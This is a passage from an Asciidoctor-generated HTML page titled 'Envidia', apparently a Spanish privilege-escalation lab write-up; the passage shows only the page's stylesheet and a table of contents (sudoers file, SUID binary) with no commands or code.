<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="generator" content="Asciidoctor 2.0.23">
<meta name="author" content="Manuel L. Quero">
<title>Envidia</title>
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300,300italic,400,400italic,600,600italic%7CNoto+Serif:400,400italic,700,700italic%7CDroid+Sans+Mono:400,700">
<style>
/*! Asciidoctor default stylesheet | MIT License | https://asciidoctor.org */
/* Uncomment the following line when using as a custom stylesheet */
/* @import "https://fonts.googleapis.com/css?family=Open+Sans:300,300italic,400,400italic,600,600italic%7CNoto+Serif:400,400italic,700,700italic%7CDroid+Sans+Mono:400,700"; */
html{font-family:sans-serif;-webkit-text-size-adjust:100%}
a{background:none}
a:focus{outline:thin dotted}
a:active,a:hover{outline:0}
h1{font-size:2em;margin:.67em 0}
b,strong{font-weight:bold}
abbr{font-size:.9em}
abbr[title]{cursor:help;border-bottom:1px dotted #dddddf;text-decoration:none}
dfn{font-style:italic}
hr{height:0}
mark{background:#ff0;color:#000}
code,kbd,pre,samp{font-family:monospace;font-size:1em}
pre{white-space:pre-wrap}
q{quotes:"\201C" "\201D" "\2018" "\2019"}
small{font-size:80%}
sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}
sup{top:-.5em}
sub{bottom:-.25em}
img{border:0}
svg:not(:root){overflow:hidden}
figure{margin:0}
audio,video{display:inline-block}
audio:not([controls]){display:none;height:0}
fieldset{border:1px solid silver;margin:0 2px;padding:.35em .625em .75em}
legend{border:0;padding:0}
button,input,select,textarea{font-family:inherit;font-size:100%;margin:0}
button,input{line-height:normal}
button,select{text-transform:none}
button,html input[type=button],input[type=reset],input[type=submit]{-webkit-appearance:button;cursor:pointer}
button[disabled],html input[disabled]{cursor:default}
input[type=checkbox],input[type=radio]{padding:0}
button::-moz-focus-inner,input::-moz-focus-inner{border:0;padding:0}
textarea{overflow:auto;vertical-align:top}
table{border-collapse:collapse;border-spacing:0}
*,::before,::after{box-sizing:border-box}
html,body{font-size:100%}
body{background:#fff;color:rgba(0,0,0,.8);padding:0;margin:0;font-family:"Noto Serif","DejaVu Serif",serif;line-height:1;position:relative;cursor:auto;-moz-tab-size:4;-o-tab-size:4;tab-size:4;word-wrap:anywhere;-moz-osx-font-smoothing:grayscale;-webkit-font-smoothing:antialiased}
a:hover{cursor:pointer}
img,object,embed{max-width:100%;height:auto}
object,embed{height:100%}
img{-ms-interpolation-mode:bicubic}
.left{float:left!important}
.right{float:right!important}
.text-left{text-align:left!important}
.text-right{text-align:right!important}
.text-center{text-align:center!important}
.text-justify{text-align:justify!important}
.hide{display:none}
img,object,svg{display:inline-block;vertical-align:middle}
textarea{height:auto;min-height:50px}
select{width:100%}
.subheader,.admonitionblock td.content>.title,.audioblock>.title,.exampleblock>.title,.imageblock>.title,.listingblock>.title,.literalblock>.title,.stemblock>.title,.openblock>.title,.paragraph>.title,.quoteblock>.title,table.tableblock>.title,.verseblock>.title,.videoblock>.title,.dlist>.title,.olist>.title,.ulist>.title,.qlist>.title,.hdlist>.title{line-height:1.45;color:#7a2518;font-weight:400;margin-top:0;margin-bottom:.25em}
div,dl,dt,dd,ul,ol,li,h1,h2,h3,#toctitle,.sidebarblock>.content>.title,h4,h5,h6,pre,form,p,blockquote,th,td{margin:0;padding:0}
a{color:#2156a5;text-decoration:underline;line-height:inherit}
a:hover,a:focus{color:#1d4b8f}
a img{border:0}
p{line-height:1.6;margin-bottom:1.25em;text-rendering:optimizeLegibility}
p aside{font-size:.875em;line-height:1.35;font-style:italic}
h1,h2,h3,#toctitle,.sidebarblock>.content>.title,h4,h5,h6{font-family:"Open Sans","DejaVu Sans",sans-serif;font-weight:300;font-style:normal;color:#ba3925;text-rendering:optimizeLegibility;margin-top:1em;margin-bottom:.5em;line-height:1.0125em}
h1 small,h2 small,h3 small,#toctitle small,.sidebarblock>.content>.title small,h4 small,h5 small,h6 small{font-size:60%;color:#e99b8f;line-height:0}
h1{font-size:2.125em}
h2{font-size:1.6875em}
h3,#toctitle,.sidebarblock>.content>.title{font-size:1.375em}
h4,h5{font-size:1.125em}
h6{font-size:1em}
hr{border:solid #dddddf;border-width:1px 0 0;clear:both;margin:1.25em 0 1.1875em}
em,i{font-style:italic;line-height:inherit}
strong,b{font-weight:bold;line-height:inherit}
small{font-size:60%;line-height:inherit}
code{font-family:"Droid Sans Mono","DejaVu Sans Mono",monospace;font-weight:400;color:rgba(0,0,0,.9)}
ul,ol,dl{line-height:1.6;margin-bottom:1.25em;list-style-position:outside;font-family:inherit}
ul,ol{margin-left:1.5em}
ul li ul,ul li ol{margin-left:1.25em;margin-bottom:0}
ul.circle{list-style-type:circle}
ul.disc{list-style-type:disc}
ul.square{list-style-type:square}
ul.circle ul:not([class]),ul.disc ul:not([class]),ul.square ul:not([class]){list-style:inherit}
ol li ul,ol li ol{margin-left:1.25em;margin-bottom:0}
dl dt{margin-bottom:.3125em;font-weight:bold}
dl dd{margin-bottom:1.25em}
blockquote{margin:0 0 1.25em;padding:.5625em 1.25em 0 1.1875em;border-left:1px solid #ddd}
blockquote,blockquote p{line-height:1.6;color:rgba(0,0,0,.85)}
@media screen and (min-width:768px){h1,h2,h3,#toctitle,.sidebarblock>.content>.title,h4,h5,h6{line-height:1.2}
h1{font-size:2.75em}
h2{font-size:2.3125em}
h3,#toctitle,.sidebarblock>.content>.title{font-size:1.6875em}
h4{font-size:1.4375em}}
table{background:#fff;margin-bottom:1.25em;border:1px solid #dedede;word-wrap:normal}
table thead,table tfoot{background:#f7f8f7}
table thead tr th,table thead tr td,table tfoot tr th,table tfoot tr td{padding:.5em .625em .625em;font-size:inherit;color:rgba(0,0,0,.8);text-align:left}
table tr th,table tr td{padding:.5625em .625em;font-size:inherit;color:rgba(0,0,0,.8)}
table tr.even,table tr.alt{background:#f8f8f7}
table thead tr th,table tfoot tr th,table tbody tr td,table tr td,table tfoot tr td{line-height:1.6}
h1,h2,h3,#toctitle,.sidebarblock>.content>.title,h4,h5,h6{line-height:1.2;word-spacing:-.05em}
h1 strong,h2 strong,h3 strong,#toctitle strong,.sidebarblock>.content>.title strong,h4 strong,h5 strong,h6 strong{font-weight:400}
.center{margin-left:auto;margin-right:auto}
.stretch{width:100%}
.clearfix::before,.clearfix::after,.float-group::before,.float-group::after{content:" ";display:table}
.clearfix::after,.float-group::after{clear:both}
:not(pre).nobreak{word-wrap:normal}
:not(pre).nowrap{white-space:nowrap}
:not(pre).pre-wrap{white-space:pre-wrap}
:not(pre):not([class^=L])>code{font-size:.9375em;font-style:normal!important;letter-spacing:0;padding:.1em .5ex;word-spacing:-.15em;background:#f7f7f8;border-radius:4px;line-height:1.45;text-rendering:optimizeSpeed}
pre{color:rgba(0,0,0,.9);font-family:"Droid Sans Mono","DejaVu Sans Mono",monospace;line-height:1.45;text-rendering:optimizeSpeed}
pre code,pre pre{color:inherit;font-size:inherit;line-height:inherit}
pre>code{display:block}
pre.nowrap,pre.nowrap pre{white-space:pre;word-wrap:normal}
em em{font-style:normal}
strong strong{font-weight:400}
.keyseq{color:rgba(51,51,51,.8)}
kbd{font-family:"Droid Sans Mono","DejaVu Sans Mono",monospace;display:inline-block;color:rgba(0,0,0,.8);font-size:.65em;line-height:1.45;background:#f7f7f7;border:1px solid #ccc;border-radius:3px;box-shadow:0 1px 0 rgba(0,0,0,.2),inset 0 0 0 .1em #fff;margin:0 .15em;padding:.2em .5em;vertical-align:middle;position:relative;top:-.1em;white-space:nowrap}
.keyseq kbd:first-child{margin-left:0}
.keyseq kbd:last-child{margin-right:0}
.menuseq,.menuref{color:#000}
.menuseq b:not(.caret),.menuref{font-weight:inherit}
.menuseq{word-spacing:-.02em}
.menuseq b.caret{font-size:1.25em;line-height:.8}
.menuseq i.caret{font-weight:bold;text-align:center;width:.45em}
b.button::before,b.button::after{position:relative;top:-1px;font-weight:400}
b.button::before{content:"[";padding:0 3px 0 2px}
b.button::after{content:"]";padding:0 2px 0 3px}
p a>code:hover{color:rgba(0,0,0,.9)}
#header,#content,#footnotes,#footer{width:100%;margin:0 auto;max-width:62.5em;*zoom:1;position:relative;padding-left:.9375em;padding-right:.9375em}
#header::before,#header::after,#content::before,#content::after,#footnotes::before,#footnotes::after,#footer::before,#footer::after{content:" ";display:table}
#header::after,#content::after,#footnotes::after,#footer::after{clear:both}
#content{margin-top:1.25em}
#content::before{content:none}
#header>h1:first-child{color:rgba(0,0,0,.85);margin-top:2.25rem;margin-bottom:0}
#header>h1:first-child+#toc{margin-top:8px;border-top:1px solid #dddddf}
#header>h1:only-child{border-bottom:1px solid #dddddf;padding-bottom:8px}
#header .details{border-bottom:1px solid #dddddf;line-height:1.45;padding-top:.25em;padding-bottom:.25em;padding-left:.25em;color:rgba(0,0,0,.6);display:flex;flex-flow:row wrap}
#header .details span:first-child{margin-left:-.125em}
#header .details span.email a{color:rgba(0,0,0,.85)}
#header .details br{display:none}
#header .details br+span::before{content:"\00a0\2013\00a0"}
#header .details br+span.author::before{content:"\00a0\22c5\00a0";color:rgba(0,0,0,.85)}
#header .details br+span#revremark::before{content:"\00a0|\00a0"}
#header #revnumber{text-transform:capitalize}
#header #revnumber::after{content:"\00a0"}
#content>h1:first-child:not([class]){color:rgba(0,0,0,.85);border-bottom:1px solid #dddddf;padding-bottom:8px;margin-top:0;padding-top:1rem;margin-bottom:1.25rem}
#toc{border-bottom:1px solid #e7e7e9;padding-bottom:.5em}
#toc>ul{margin-left:.125em}
#toc ul.sectlevel0>li>a{font-style:italic}
#toc ul.sectlevel0 ul.sectlevel1{margin:.5em 0}
#toc ul{font-family:"Open Sans","DejaVu Sans",sans-serif;list-style-type:none}
#toc li{line-height:1.3334;margin-top:.3334em}
#toc a{text-decoration:none}
#toc a:active{text-decoration:underline}
#toctitle{color:#7a2518;font-size:1.2em}
@media screen and (min-width:768px){#toctitle{font-size:1.375em}
body.toc2{padding-left:15em;padding-right:0}
body.toc2 #header>h1:nth-last-child(2){border-bottom:1px solid #dddddf;padding-bottom:8px}
#toc.toc2{margin-top:0!important;background:#f8f8f7;position:fixed;width:15em;left:0;top:0;border-right:1px solid #e7e7e9;border-top-width:0!important;border-bottom-width:0!important;z-index:1000;padding:1.25em 1em;height:100%;overflow:auto}
#toc.toc2 #toctitle{margin-top:0;margin-bottom:.8rem;font-size:1.2em}
#toc.toc2>ul{font-size:.9em;margin-bottom:0}
#toc.toc2 ul ul{margin-left:0;padding-left:1em}
#toc.toc2 ul.sectlevel0 ul.sectlevel1{padding-left:0;margin-top:.5em;margin-bottom:.5em}
body.toc2.toc-right{padding-left:0;padding-right:15em}
body.toc2.toc-right #toc.toc2{border-right-width:0;border-left:1px solid #e7e7e9;left:auto;right:0}}
@media screen and (min-width:1280px){body.toc2{padding-left:20em;padding-right:0}
#toc.toc2{width:20em}
#toc.toc2 #toctitle{font-size:1.375em}
#toc.toc2>ul{font-size:.95em}
#toc.toc2 ul ul{padding-left:1.25em}
body.toc2.toc-right{padding-left:0;padding-right:20em}}
#content #toc{border:1px solid #e0e0dc;margin-bottom:1.25em;padding:1.25em;background:#f8f8f7;border-radius:4px}
#content #toc>:first-child{margin-top:0}
#content #toc>:last-child{margin-bottom:0}
#footer{max-width:none;background:rgba(0,0,0,.8);padding:1.25em}
#footer-text{color:hsla(0,0%,100%,.8);line-height:1.44}
#content{margin-bottom:.625em}
.sect1{padding-bottom:.625em}
@media screen and (min-width:768px){#content{margin-bottom:1.25em}
.sect1{padding-bottom:1.25em}}
.sect1:last-child{padding-bottom:0}
.sect1+.sect1{border-top:1px solid #e7e7e9}
#content h1>a.anchor,h2>a.anchor,h3>a.anchor,#toctitle>a.anchor,.sidebarblock>.content>.title>a.anchor,h4>a.anchor,h5>a.anchor,h6>a.anchor{position:absolute;z-index:1001;width:1.5ex;margin-left:-1.5ex;display:block;text-decoration:none!important;visibility:hidden;text-align:center;font-weight:400}
#content h1>a.anchor::before,h2>a.anchor::before,h3>a.anchor::before,#toctitle>a.anchor::before,.sidebarblock>.content>.title>a.anchor::before,h4>a.anchor::before,h5>a.anchor::before,h6>a.anchor::before{content:"\00A7";font-size:.85em;display:block;padding-top:.1em}
#content h1:hover>a.anchor,#content h1>a.anchor:hover,h2:hover>a.anchor,h2>a.anchor:hover,h3:hover>a.anchor,#toctitle:hover>a.anchor,.sidebarblock>.content>.title:hover>a.anchor,h3>a.anchor:hover,#toctitle>a.anchor:hover,.sidebarblock>.content>.title>a.anchor:hover,h4:hover>a.anchor,h4>a.anchor:hover,h5:hover>a.anchor,h5>a.anchor:hover,h6:hover>a.anchor,h6>a.anchor:hover{visibility:visible}
#content h1>a.link,h2>a.link,h3>a.link,#toctitle>a.link,.sidebarblock>.content>.title>a.link,h4>a.link,h5>a.link,h6>a.link{color:#ba3925;text-decoration:none}
#content h1>a.link:hover,h2>a.link:hover,h3>a.link:hover,#toctitle>a.link:hover,.sidebarblock>.content>.title>a.link:hover,h4>a.link:hover,h5>a.link:hover,h6>a.link:hover{color:#a53221}
details,.audioblock,.imageblock,.literalblock,.listingblock,.stemblock,.videoblock{margin-bottom:1.25em}
details{margin-left:1.25rem}
details>summary{cursor:pointer;display:block;position:relative;line-height:1.6;margin-bottom:.625rem;outline:none;-webkit-tap-highlight-color:transparent}
details>summary::-webkit-details-marker{display:none}
details>summary::before{content:"";border:solid transparent;border-left:solid;border-width:.3em 0 .3em .5em;position:absolute;top:.5em;left:-1.25rem;transform:translateX(15%)}
details[open]>summary::before{border:solid transparent;border-top:solid;border-width:.5em .3em 0;transform:translateY(15%)}
details>summary::after{content:"";width:1.25rem;height:1em;position:absolute;top:.3em;left:-1.25rem}
.admonitionblock td.content>.title,.audioblock>.title,.exampleblock>.title,.imageblock>.title,.listingblock>.title,.literalblock>.title,.stemblock>.title,.openblock>.title,.paragraph>.title,.quoteblock>.title,table.tableblock>.title,.verseblock>.title,.videoblock>.title,.dlist>.title,.olist>.title,.ulist>.title,.qlist>.title,.hdlist>.title{text-rendering:optimizeLegibility;text-align:left;font-family:"Noto Serif","DejaVu Serif",serif;font-size:1rem;font-style:italic}
table.tableblock.fit-content>caption.title{white-space:nowrap;width:0}
.paragraph.lead>p,#preamble>.sectionbody>[class=paragraph]:first-of-type p{font-size:1.21875em;line-height:1.6;color:rgba(0,0,0,.85)}
.admonitionblock>table{border-collapse:separate;border:0;background:none;width:100%}
.admonitionblock>table td.icon{text-align:center;width:80px}
.admonitionblock>table td.icon img{max-width:none}
.admonitionblock>table td.icon .title{font-weight:bold;font-family:"Open Sans","DejaVu Sans",sans-serif;text-transform:uppercase}
.admonitionblock>table td.content{padding-left:1.125em;padding-right:1.25em;border-left:1px solid #dddddf;color:rgba(0,0,0,.6);word-wrap:anywhere}
.admonitionblock>table td.content>:last-child>:last-child{margin-bottom:0}
.exampleblock>.content{border:1px solid #e6e6e6;margin-bottom:1.25em;padding:1.25em;background:#fff;border-radius:4px}
.sidebarblock{border:1px solid #dbdbd6;margin-bottom:1.25em;padding:1.25em;background:#f3f3f2;border-radius:4px}
.sidebarblock>.content>.title{color:#7a2518;margin-top:0;text-align:center}
.exampleblock>.content>:first-child,.sidebarblock>.content>:first-child{margin-top:0}
.exampleblock>.content>:last-child,.exampleblock>.content>:last-child>:last-child,.exampleblock>.content .olist>ol>li:last-child>:last-child,.exampleblock>.content .ulist>ul>li:last-child>:last-child,.exampleblock>.content .qlist>ol>li:last-child>:last-child,.sidebarblock>.content>:last-child,.sidebarblock>.content>:last-child>:last-child,.sidebarblock>.content .olist>ol>li:last-child>:last-child,.sidebarblock>.content .ulist>ul>li:last-child>:last-child,.sidebarblock>.content .qlist>ol>li:last-child>:last-child{margin-bottom:0}
.literalblock pre,.listingblock>.content>pre{border-radius:4px;overflow-x:auto;padding:1em;font-size:.8125em}
@media screen and (min-width:768px){.literalblock pre,.listingblock>.content>pre{font-size:.90625em}}
@media screen and (min-width:1280px){.literalblock pre,.listingblock>.content>pre{font-size:1em}}
.literalblock pre,.listingblock>.content>pre:not(.highlight),.listingblock>.content>pre[class=highlight],.listingblock>.content>pre[class^="highlight "]{background:#f7f7f8}
.literalblock.output pre{color:#f7f7f8;background:rgba(0,0,0,.9)}
.listingblock>.content{position:relative}
.listingblock code[data-lang]::before{display:none;content:attr(data-lang);position:absolute;font-size:.75em;top:.425rem;right:.5rem;line-height:1;text-transform:uppercase;color:inherit;opacity:.5}
.listingblock:hover code[data-lang]::before{display:block}
.listingblock.terminal pre .command::before{content:attr(data-prompt);padding-right:.5em;color:inherit;opacity:.5}
.listingblock.terminal pre .command:not([data-prompt])::before{content:"$"}
.listingblock pre.highlightjs{padding:0}
.listingblock pre.highlightjs>code{padding:1em;border-radius:4px}
.listingblock pre.prettyprint{border-width:0}
.prettyprint{background:#f7f7f8}
pre.prettyprint .linenums{line-height:1.45;margin-left:2em}
pre.prettyprint li{background:none;list-style-type:inherit;padding-left:0}
pre.prettyprint li code[data-lang]::before{opacity:1}
pre.prettyprint li:not(:first-child) code[data-lang]::before{display:none}
table.linenotable{border-collapse:separate;border:0;margin-bottom:0;background:none}
table.linenotable td[class]{color:inherit;vertical-align:top;padding:0;line-height:inherit;white-space:normal}
table.linenotable td.code{padding-left:.75em}
table.linenotable td.linenos,pre.pygments .linenos{border-right:1px solid;opacity:.35;padding-right:.5em;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
pre.pygments span.linenos{display:inline-block;margin-right:.75em}
.quoteblock{margin:0 1em 1.25em 1.5em;display:table}
.quoteblock:not(.excerpt)>.title{margin-left:-1.5em;margin-bottom:.75em}
.quoteblock blockquote,.quoteblock p{color:rgba(0,0,0,.85);font-size:1.15rem;line-height:1.75;word-spacing:.1em;letter-spacing:0;font-style:italic;text-align:justify}
.quoteblock blockquote{margin:0;padding:0;border:0}
.quoteblock blockquote::before{content:"\201c";float:left;font-size:2.75em;font-weight:bold;line-height:.6em;margin-left:-.6em;color:#7a2518;text-shadow:0 1px 2px rgba(0,0,0,.1)}
.quoteblock blockquote>.paragraph:last-child p{margin-bottom:0}
.quoteblock .attribution{margin-top:.75em;margin-right:.5ex;text-align:right}
.verseblock{margin:0 1em 1.25em}
.verseblock pre{font-family:"Open Sans","DejaVu Sans",sans-serif;font-size:1.15rem;color:rgba(0,0,0,.85);font-weight:300;text-rendering:optimizeLegibility}
.verseblock pre strong{font-weight:400}
.verseblock .attribution{margin-top:1.25rem;margin-left:.5ex}
.quoteblock .attribution,.verseblock .attribution{font-size:.9375em;line-height:1.45;font-style:italic}
.quoteblock .attribution br,.verseblock .attribution br{display:none}
.quoteblock .attribution cite,.verseblock .attribution cite{display:block;letter-spacing:-.025em;color:rgba(0,0,0,.6)}
.quoteblock.abstract blockquote::before,.quoteblock.excerpt blockquote::before,.quoteblock .quoteblock blockquote::before{display:none}
.quoteblock.abstract blockquote,.quoteblock.abstract p,.quoteblock.excerpt blockquote,.quoteblock.excerpt p,.quoteblock .quoteblock blockquote,.quoteblock .quoteblock p{line-height:1.6;word-spacing:0}
.quoteblock.abstract{margin:0 1em 1.25em;display:block}
.quoteblock.abstract>.title{margin:0 0 .375em;font-size:1.15em;text-align:center}
.quoteblock.excerpt>blockquote,.quoteblock .quoteblock{padding:0 0 .25em 1em;border-left:.25em solid #dddddf}
.quoteblock.excerpt,.quoteblock .quoteblock{margin-left:0}
.quoteblock.excerpt blockquote,.quoteblock.excerpt p,.quoteblock .quoteblock blockquote,.quoteblock .quoteblock p{color:inherit;font-size:1.0625rem}
.quoteblock.excerpt .attribution,.quoteblock .quoteblock .attribution{color:inherit;font-size:.85rem;text-align:left;margin-right:0}
p.tableblock:last-child{margin-bottom:0}
td.tableblock>.content{margin-bottom:1.25em;word-wrap:anywhere}
td.tableblock>.content>:last-child{margin-bottom:-1.25em}
table.tableblock,th.tableblock,td.tableblock{border:0 solid #dedede}
table.grid-all>*>tr>*{border-width:1px}
table.grid-cols>*>tr>*{border-width:0 1px}
table.grid-rows>*>tr>*{border-width:1px 0}
table.frame-all{border-width:1px}
table.frame-ends{border-width:1px 0}
table.frame-sides{border-width:0 1px}
table.frame-none>colgroup+*>:first-child>*,table.frame-sides>colgroup+*>:first-child>*{border-top-width:0}
table.frame-none>:last-child>:last-child>*,table.frame-sides>:last-child>:last-child>*{border-bottom-width:0}
table.frame-none>*>tr>:first-child,table.frame-ends>*>tr>:first-child{border-left-width:0}
table.frame-none>*>tr>:last-child,table.frame-ends>*>tr>:last-child{border-right-width:0}
table.stripes-all>*>tr,table.stripes-odd>*>tr:nth-of-type(odd),table.stripes-even>*>tr:nth-of-type(even),table.stripes-hover>*>tr:hover{background:#f8f8f7}
th.halign-left,td.halign-left{text-align:left}
th.halign-right,td.halign-right{text-align:right}
th.halign-center,td.halign-center{text-align:center}
th.valign-top,td.valign-top{vertical-align:top}
th.valign-bottom,td.valign-bottom{vertical-align:bottom}
th.valign-middle,td.valign-middle{vertical-align:middle}
table thead th,table tfoot th{font-weight:bold}
tbody tr th{background:#f7f8f7}
tbody tr th,tbody tr th p,tfoot tr th,tfoot tr th p{color:rgba(0,0,0,.8);font-weight:bold}
p.tableblock>code:only-child{background:none;padding:0}
p.tableblock{font-size:1em}
ol{margin-left:1.75em}
ul li ol{margin-left:1.5em}
dl dd{margin-left:1.125em}
dl dd:last-child,dl dd:last-child>:last-child{margin-bottom:0}
li p,ul dd,ol dd,.olist .olist,.ulist .ulist,.ulist .olist,.olist .ulist{margin-bottom:.625em}
ul.checklist,ul.none,ol.none,ul.no-bullet,ol.no-bullet,ol.unnumbered,ul.unstyled,ol.unstyled{list-style-type:none}
ul.no-bullet,ol.no-bullet,ol.unnumbered{margin-left:.625em}
ul.unstyled,ol.unstyled{margin-left:0}
li>p:empty:only-child::before{content:"";display:inline-block}
ul.checklist>li>p:first-child{margin-left:-1em}
ul.checklist>li>p:first-child>.fa-square-o:first-child,ul.checklist>li>p:first-child>.fa-check-square-o:first-child{width:1.25em;font-size:.8em;position:relative;bottom:.125em}
ul.checklist>li>p:first-child>input[type=checkbox]:first-child{margin-right:.25em}
ul.inline{display:flex;flex-flow:row wrap;list-style:none;margin:0 0 .625em -1.25em}
ul.inline>li{margin-left:1.25em}
.unstyled dl dt{font-weight:400;font-style:normal}
ol.arabic{list-style-type:decimal}
ol.decimal{list-style-type:decimal-leading-zero}
ol.loweralpha{list-style-type:lower-alpha}
ol.upperalpha{list-style-type:upper-alpha}
ol.lowerroman{list-style-type:lower-roman}
ol.upperroman{list-style-type:upper-roman}
ol.lowergreek{list-style-type:lower-greek}
.hdlist>table,.colist>table{border:0;background:none}
.hdlist>table>tbody>tr,.colist>table>tbody>tr{background:none}
td.hdlist1,td.hdlist2{vertical-align:top;padding:0 .625em}
td.hdlist1{font-weight:bold;padding-bottom:1.25em}
td.hdlist2{word-wrap:anywhere}
.literalblock+.colist,.listingblock+.colist{margin-top:-.5em}
.colist td:not([class]):first-child{padding:.4em .75em 0;line-height:1;vertical-align:top}
.colist td:not([class]):first-child img{max-width:none}
.colist td:not([class]):last-child{padding:.25em 0}
.thumb,.th{line-height:0;display:inline-block;border:4px solid #fff;box-shadow:0 0 0 1px #ddd}
.imageblock.left{margin:.25em .625em 1.25em 0}
.imageblock.right{margin:.25em 0 1.25em .625em}
.imageblock>.title{margin-bottom:0}
.imageblock.thumb,.imageblock.th{border-width:6px}
.imageblock.thumb>.title,.imageblock.th>.title{padding:0 .125em}
.image.left,.image.right{margin-top:.25em;margin-bottom:.25em;display:inline-block;line-height:0}
.image.left{margin-right:.625em}
.image.right{margin-left:.625em}
a.image{text-decoration:none;display:inline-block}
a.image object{pointer-events:none}
sup.footnote,sup.footnoteref{font-size:.875em;position:static;vertical-align:super}
sup.footnote a,sup.footnoteref a{text-decoration:none}
sup.footnote a:active,sup.footnoteref a:active,#footnotes .footnote a:first-of-type:active{text-decoration:underline}
#footnotes{padding-top:.75em;padding-bottom:.75em;margin-bottom:.625em}
#footnotes hr{width:20%;min-width:6.25em;margin:-.25em 0 .75em;border-width:1px 0 0}
#footnotes .footnote{padding:0 .375em 0 .225em;line-height:1.3334;font-size:.875em;margin-left:1.2em;margin-bottom:.2em}
#footnotes .footnote a:first-of-type{font-weight:bold;text-decoration:none;margin-left:-1.05em}
#footnotes .footnote:last-of-type{margin-bottom:0}
#content #footnotes{margin-top:-.625em;margin-bottom:0;padding:.75em 0}
div.unbreakable{page-break-inside:avoid}
.big{font-size:larger}
.small{font-size:smaller}
.underline{text-decoration:underline}
.overline{text-decoration:overline}
.line-through{text-decoration:line-through}
.aqua{color:#00bfbf}
.aqua-background{background:#00fafa}
.black{color:#000}
.black-background{background:#000}
.blue{color:#0000bf}
.blue-background{background:#0000fa}
.fuchsia{color:#bf00bf}
.fuchsia-background{background:#fa00fa}
.gray{color:#606060}
.gray-background{background:#7d7d7d}
.green{color:#006000}
.green-background{background:#007d00}
.lime{color:#00bf00}
.lime-background{background:#00fa00}
.maroon{color:#600000}
.maroon-background{background:#7d0000}
.navy{color:#000060}
.navy-background{background:#00007d}
.olive{color:#606000}
.olive-background{background:#7d7d00}
.purple{color:#600060}
.purple-background{background:#7d007d}
.red{color:#bf0000}
.red-background{background:#fa0000}
.silver{color:#909090}
.silver-background{background:#bcbcbc}
.teal{color:#006060}
.teal-background{background:#007d7d}
.white{color:#bfbfbf}
.white-background{background:#fafafa}
.yellow{color:#bfbf00}
.yellow-background{background:#fafa00}
span.icon>.fa{cursor:default}
a span.icon>.fa{cursor:inherit}
.admonitionblock td.icon [class^="fa icon-"]{font-size:2.5em;text-shadow:1px 1px 2px rgba(0,0,0,.5);cursor:default}
.admonitionblock td.icon .icon-note::before{content:"\f05a";color:#19407c}
.admonitionblock td.icon .icon-tip::before{content:"\f0eb";text-shadow:1px 1px 2px rgba(155,155,0,.8);color:#111}
.admonitionblock td.icon .icon-warning::before{content:"\f071";color:#bf6900}
.admonitionblock td.icon .icon-caution::before{content:"\f06d";color:#bf3400}
.admonitionblock td.icon .icon-important::before{content:"\f06a";color:#bf0000}
.conum[data-value]{display:inline-block;color:#fff!important;background:rgba(0,0,0,.8);border-radius:50%;text-align:center;font-size:.75em;width:1.67em;height:1.67em;line-height:1.67em;font-family:"Open Sans","DejaVu Sans",sans-serif;font-style:normal;font-weight:bold}
.conum[data-value] *{color:#fff!important}
.conum[data-value]+b{display:none}
.conum[data-value]::after{content:attr(data-value)}
pre .conum[data-value]{position:relative;top:-.125em}
b.conum *{color:inherit!important}
.conum:not([data-value]):empty{display:none}
dt,th.tableblock,td.content,div.footnote{text-rendering:optimizeLegibility}
h1,h2,p,td.content,span.alt,summary{letter-spacing:-.01em}
p strong,td.content strong,div.footnote strong{letter-spacing:-.005em}
p,blockquote,dt,td.content,td.hdlist1,span.alt,summary{font-size:1.0625rem}
p{margin-bottom:1.25rem}
.sidebarblock p,.sidebarblock dt,.sidebarblock td.content,p.tableblock{font-size:1em}
.exampleblock>.content{background:#fffef7;border-color:#e0e0dc;box-shadow:0 1px 4px #e0e0dc}
.print-only{display:none!important}
@page{margin:1.25cm .75cm}
@media print{*{box-shadow:none!important;text-shadow:none!important}
html{font-size:80%}
a{color:inherit!important;text-decoration:underline!important}
a.bare,a[href^="#"],a[href^="mailto:"]{text-decoration:none!important}
a[href^="http:"]:not(.bare)::after,a[href^="https:"]:not(.bare)::after{content:"(" attr(href) ")";display:inline-block;font-size:.875em;padding-left:.25em}
abbr[title]{border-bottom:1px dotted}
abbr[title]::after{content:" (" attr(title) ")"}
pre,blockquote,tr,img,object,svg{page-break-inside:avoid}
thead{display:table-header-group}
svg{max-width:100%}
p,blockquote,dt,td.content{font-size:1em;orphans:3;widows:3}
h2,h3,#toctitle,.sidebarblock>.content>.title{page-break-after:avoid}
#header,#content,#footnotes,#footer{max-width:none}
#toc,.sidebarblock,.exampleblock>.content{background:none!important}
#toc{border-bottom:1px solid #dddddf!important;padding-bottom:0!important}
body.book #header{text-align:center}
body.book #header>h1:first-child{border:0!important;margin:2.5em 0 1em}
body.book #header .details{border:0!important;display:block;padding:0!important}
body.book #header .details span:first-child{margin-left:0!important}
body.book #header .details br{display:block}
body.book #header .details br+span::before{content:none!important}
body.book #toc{border:0!important;text-align:left!important;padding:0!important;margin:0!important}
body.book #toc,body.book #preamble,body.book h1.sect0,body.book .sect1>h2{page-break-before:always}
.listingblock code[data-lang]::before{display:block}
#footer{padding:0 .9375em}
.hide-on-print{display:none!important}
.print-only{display:block!important}
.hide-for-print{display:none!important}
.show-for-print{display:inherit!important}}
@media amzn-kf8,print{#header>h1:first-child{margin-top:1.25rem}
.sect1{padding:0!important}
.sect1+.sect1{border:0}
#footer{background:none}
#footer-text{color:rgba(0,0,0,.6);font-size:.9em}}
@media amzn-kf8{#header,#content,#footnotes,#footer{padding:0}}
</style>
</head>
<body class="book toc2 toc-left">
<div id="header">
<h1>Envidia</h1>
<div class="details">
<span id="author" class="author">Manuel L. Quero</span><br>
</div>
<div id="toc" class="toc2">
<div id="toctitle">Table of Contents</div>
<ul class="sectlevel1">
<li><a href="#_despliegue_de_la_máquina">Despliegue de la máquina</a></li>
<li><a href="#_escalada_de_privilegios">Escalada de privilegios</a>
<ul class="sectlevel2">
<li><a href="#_tipos_de_escalada">Tipos de escalada</a></li>
<li><a href="#_vectores_de_ataque">Vectores de ataque</a></li>
</ul>
</li>
<li><a href="#_solucionar_la_máquina">Solucionar la máquina</a>
<ul class="sectlevel2">
<li><a href="#_1_archivo_sudoers_2">1. Archivo sudoers</a></li>
<li><a href="#_2_binario_suid_2">2. Binario SUID</a></li>
